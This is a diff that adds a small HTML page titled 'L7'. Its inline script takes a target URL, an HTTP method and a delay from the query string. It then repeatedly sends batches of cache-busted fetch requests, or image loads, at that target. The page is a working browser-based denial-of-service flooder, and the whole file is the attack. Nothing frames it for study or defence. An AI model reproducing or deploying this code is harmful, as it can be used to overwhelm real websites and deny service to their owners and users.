@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="js">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>L7</title>
+</head>
+
+<body>
+    <script>
+        let params = new URLSearchParams(window.location.search);
+        let target = params.get("target");
+        let method = params.get("method") || "GET";
+        let delay = Number(params.get("delay") || 0);
+        let useImg = Boolean(params.get("useImg"));
+        if (!target) {
+            location.href = "https://example.com"
+        } else {
+            setInterval(() => {
+                if (useImg) {
+                    if (method == "GET") {
+                        let img = new Image();
+                        img.src = target + "?" + Math.random().toString();
+                    }
+                } else {
+                    for (let i = 0; i < 10; i++) {
+                        fetch(target + "?" + Math.random().toString(), {
+                            method
+                        }).catch(() => { });
+                    }
+                }
+            }, delay);
+        }
+    </script>
+</body>
+
+</html>
